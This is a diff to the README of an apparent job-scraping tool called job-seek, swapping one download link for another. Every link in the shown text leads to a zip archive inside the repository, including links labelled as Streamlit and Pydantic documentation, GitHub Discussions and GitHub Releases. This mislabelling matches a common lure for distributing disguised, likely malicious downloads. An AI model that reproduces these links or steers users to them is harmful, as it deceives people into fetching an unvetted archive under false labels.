@@ -1,6 +1,6 @@
 # 🌟 job-seek - Effortless Job Portal Scraping
 
-[![Download job-seek](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
+[![Download job-seek](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to job-seek! This application helps you scrape job listings from various
 
 ## 📥 Download & Install
 
-To download the latest version of job-seek, **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
+To download the latest version of job-seek, **visit this page to download**: [GitHub Releases](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
 
 1. **Visit the Release Page**: Click on the link above to go to the release page.
 2. **Choose the Latest Version**: Look for the most recent version at the top of the page.
@@ -67,21 +67,21 @@ A: Job-seek scrapes real-time data, so listings are current at the time of scrap
 
 For more information about job-seek and scraping techniques, check out the following:
 
-- [Streamlit Documentation](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
-- [Web Scraping Basics](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
-- [Pydantic Documentation](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
+- [Web Scraping Basics](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
+- [Pydantic Documentation](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
 
 ## 💬 Community Support
 
 If you need help or want to share your feedback, please join our community:
 
-- Visit our [GitHub Discussions](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip) to ask questions and share experiences.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip) to ask questions and share experiences.
 - Connect with other users and developers for support and ideas.
 
 ## 🔗 Stay Updated
 
 Keep up with any updates and news by following our repository:
 
-- Check for updates: [GitHub Releases](https://raw.githubusercontent.com/HrDsai/job-seek/main/mistryst/job-seek.zip)
+- Check for updates: [GitHub Releases](https://raw.githubusercontent.com/HrDsai/job-seek/main/services/scrape/extractors/job_seek_v1.0-beta.5.zip)
 
 Thank you for using job-seek! We hope it simplifies your job search.
